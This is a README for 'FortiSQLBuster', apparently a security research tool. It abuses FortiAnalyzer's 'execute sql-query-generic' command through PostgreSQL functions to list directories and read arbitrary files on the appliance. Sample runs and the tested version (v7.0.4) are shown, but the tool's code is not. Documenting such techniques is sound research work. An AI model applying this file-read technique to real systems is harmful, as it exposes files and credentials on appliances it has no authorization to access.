# FortiSQLBuster
A FortiAnalyzer file and directory contents lister tool.

## Description
FortiSQLBuster abuse postgresDB via *execute sql-query-generic* cli command to list and get file/directory contents on the file system.

## Usage
This tool will try automatically to list directory content or to print file content in sequence, before printing an eventual error message.

### List directory content:
```bash
└─$ python3 FortiSQLBuster.py
>: /
<REDACTED_HOSTNAME> #  pg_ls_dir
------------
 proc
 bin
 share
 run
 data
 sbin
 .
 .
 .
 sys
 usr
 etc
 var
 lib64
 lib
 tmp
 root
 dev

```
### Get file content:
```bash
└─$ python3 FortiSQLBuster.py
>: /tmp/afilledfile.txt
<REDACTED_HOSTNAME> #          convert_from
-------------------------------
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

```


## Tested on:
```bash
└─$ python3 FortiSQLBuster.py
<REDACTED> # get system status
Platform Type                   : FAZVM64
Platform Full Name              : FortiAnalyzer-VM64
Version                         : v7.0.4-build0306 220608 (GA)
Serial Number                   : <REDACTED>
BIOS version                    : 04000002
Hostname                        : <REDACTED>
Max Number of Admin Domains     : <REDACTED>
Admin Domain Configuration      : Disabled
FIPS Mode                       : Disabled
HA Mode                         : Stand Alone
Branch Point                    : <REDACTED>
Release Version Information     : GA
Current Time                    : Mon Apr 17 16:19:52 CEST 2023
Daylight Time Saving            : Yes
Time Zone                       : (GMT+1:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna.
x86-64 Applications             : Yes
Disk Usage                      : Free 66.04GB, Total 79.79GB
File System                     : Ext4
License Status                  : Valid
```
